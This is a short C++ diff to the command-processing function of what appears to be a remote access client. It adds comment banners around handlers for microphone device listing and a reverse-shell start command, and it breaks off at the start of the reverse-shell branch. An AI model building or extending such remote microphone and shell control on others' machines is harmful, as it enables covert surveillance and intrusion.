@@ -461,6 +461,9 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     //#####################################################
 
 
+    //#####################################################
+    //#####################################################
+    //                    MIC                             # 
     //Lista de dispositivos de entrada (mic)
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Refre_Dispositivos) {
         if (this->mod_Mic == nullptr) {
@@ -494,7 +497,11 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         this->mod_Mic = nullptr;
         return;
     }
+    //#####################################################
 
+    //#####################################################
+    //#####################################################
+    //                REVERSE SHELL                       # 
     //Iniciar shell
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::Reverse_Shell_Start) {
         if (this->reverseSHELL != nullptr) {
